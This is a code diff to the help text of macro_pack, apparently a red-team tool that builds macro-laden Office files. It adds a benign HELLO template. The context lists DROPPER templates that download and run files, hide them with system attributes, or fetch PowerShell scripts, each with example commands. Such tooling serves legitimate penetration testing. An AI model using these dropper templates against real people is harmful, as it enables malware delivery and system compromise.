@@ -92,6 +92,8 @@ def usage():
         Note that macro_pack will automatically detect AutoOpen, Workbook_Open, or Document_Open  as the start function
     -t, --template=TEMPLATE_NAME 
         Available templates:
+            HELLO   -> Just print a hello message and awareness about macro
+                    -> Example use: echo "@EmericNasi" | %s -t HELLO -P hello.pptm
             DROPPER -> Download and exec file
                     -> Example use:  echo <file_to_drop_url> "<download_path>" | %s -t DROPPER -o -x dropper.xls
             DROPPER2 -> Download and exec file. File attributes are also set to system, read-only, and hidden
@@ -100,7 +102,7 @@ def usage():
                     -> Example use:  echo "<powershell_script_url>" | %s -t DROPPER_PS -o -w powpow.doc
                     Note: This payload will download PowerShdll from Github.
     -v, --vba-output=VBA_FILE_PATH Output generated vba macro (text format) to given path.         
-""" % (sys.argv[0],sys.argv[0],sys.argv[0])   
+""" % (sys.argv[0],sys.argv[0],sys.argv[0],sys.argv[0])   
 
     details +=proDetails
 
